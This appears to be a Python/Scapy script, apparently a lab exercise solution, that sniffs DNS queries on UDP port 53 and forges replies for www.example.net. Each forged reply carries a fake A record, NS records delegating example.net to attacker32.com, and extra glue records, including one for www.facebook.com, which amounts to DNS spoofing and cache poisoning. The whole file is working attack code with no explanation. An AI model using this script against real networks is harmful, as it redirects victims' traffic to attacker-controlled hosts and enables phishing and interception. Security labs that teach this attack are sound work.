#!/usr/bin/env python

from scapy.all import *
conf.L3socket=L3RawSocket

def spoof(pkt):
  if DNS in pkt and "www.example.net" in pkt[DNS].qd.qname:
    src_port = pkt[UDP].sport

    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
    
    ans_sec = DNSRR(rrname=pkt[DNS].qd.qname, type="A",
			rdata="1.2.3.4", ttl=259200)

    ns_sec1 = DNSRR(rrname="example.net", type="NS",
			rdata="attacker32.com", ttl=259200)
    ns_sec2 = DNSRR(rrname="example.net", type="NS",
			rdata="ns.example.net", ttl=259200)

    ar_sec1 = DNSRR(rrname="attacker32.com", type="A",
			rdata="1.2.3.4", ttl=259200)
    ar_sec2 = DNSRR(rrname="ns.example.net", type="A",
			rdata="5.6.7.8", ttl=259200)
    ar_sec3 = DNSRR(rrname="www.facebook.com", type="A",
			rdata="3.4.5.6", ttl=259200)
    
    dns = DNS(id=pkt[DNS].id, 
        	qr=1, aa=1, rd=0, 
        	qdcount=1, nscount=2, ancount=1, arcount=3,
        	qd=pkt[DNS].qd, ns=ns_sec1/ns_sec2, 
		an=ans_sec, ar=ar_sec1/ar_sec2/ar_sec3) 
    
    spoof_pkt = ip/udp/dns
    send(spoof_pkt)

if __name__ == "__main__":
  filter_str = "udp and dst port 53"
  sniff(filter=filter_str, prn=spoof)
